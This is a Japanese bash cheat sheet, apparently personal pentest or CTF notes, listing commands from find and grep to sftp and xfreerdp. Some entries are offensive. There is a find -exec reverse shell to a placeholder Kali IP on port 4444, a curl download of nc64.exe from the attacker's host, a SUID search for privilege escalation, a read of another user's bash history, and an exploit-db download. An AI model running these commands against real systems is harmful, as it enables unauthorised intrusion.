# ubuntu bash

* ファイル指定

  ``` shell
      # 便利
      # $(which XXX)
      cp $(which find) /tmp/find
  ```

* cat

  ``` shell
      #過去の入力情報の表示
      cat /home/XXX/.bash_history
  ```

* cron

  ``` shell
      # 設定確認
      cat /etc/crontab
      #　登録
      crontab -u <ユーザ名> -e    
  ```

* curl

  ``` shell
      #curlでファイル転送
      curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
  ```

* find

  ``` shell
      #sudo設定のファイルを検索
      find / -perm -4000
      #または
      find / -type f -perm -4000 -ls 2>/dev/null

      #コマンド実行
      find ~/.profile -exec /bin/bash -p -i >& /dev/tcp/<kali ip address>/4444 0>&1 \; -quit
  ```

* grep
  
  ```shell
      #階層検索
      grep -r
      #よく使う
      ls -l | grep -re XXXX -re YYY
      # 該当するファイル名表示
      grep -l
      # nseスクリプトで脆弱性検索
      grep <app_name> -rl /usr/share/nmap/scripts/ 
  ```

* egrep

  ``` shell
      # 実行されているOSバージョンを表示
      ls /etc | egrep -e "fedore*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release"
  ```

* ユーザ情報

  ``` shell
      id
  ```

* マウントされているボリュームの取得
  
  ``` shell
     mount
  ```

* netstat

  ``` shell
      # ネットワーク状態確認
      netstat -pantu
  ```

* openssl
  
```shell
  # pass123のソルトハッシュ値の生成
  openssl passwd -1 -salt -ignite pass123
```

* パスワード変更

  ```shell
      passwd [USER_NAME]
  ```

* ProxyChains
  
  ``` shell
      #dynamic port forward　 
      #proxy経由でターゲットへのnmapスキャン
      proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
  ```

* pythonの仮想環境
  
  ``` bash
      #仮想環境の作成
      python3 -m venv myenv
      #仮想環境の有効か
      source myenv/bin/activate
      #仮想環境内でパッケージインストール
      pip install <package_name>
      #作業後仮想環境を無効化
      deactivate

      #virtualenvをバージョン指定でインストール
      python3 -m pip install virtualenv==XX.XX.X
      #Venvのpythonバージョン指定の起動
      python3 -m virtualenv --python=/usr/bin/pythonX.X.X myenv
  ```

* sftp
  
  ``` shell
      # sftp -i <秘密鍵> -P 8080 <ユーザ>@localhost
      sftp -i /home/kali/id_rsa -P 8080 testuser@localhost
      #接続後 ファイルを自分の端末に転送
      get /C:/Users/testuser/Desktop/Pentest/flag.txt
  ```

* ss
  
  ``` shell
      # portの開通確認
      ss -pantu
  ```

* ssh

  ``` shell
      ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
  ```

* sudo
  
  ``` shell
      #sudoの情報表示
      sudo -l
  ```

* wget
  * ダウンロード

  ``` shell
      # ダウンロード
      wget https://www.exploit-db.com/download/XXXXXX -O filename
  ```
  
  * 自前のwebサーバーからファイルをダウンロードさせる。

  ``` shell
      # Web server
      python -m http.server 8000
      # 転送
      # wget -O [転送先] [転送するファイル]
      wget -O /tmp/XXX http://XXX.XXX.XXX.XXX:8000/filename
  ```

* xfreerdp

  ``` shell
      xfreerdp /u:win /p:password /v:127.0.0.1
  ```
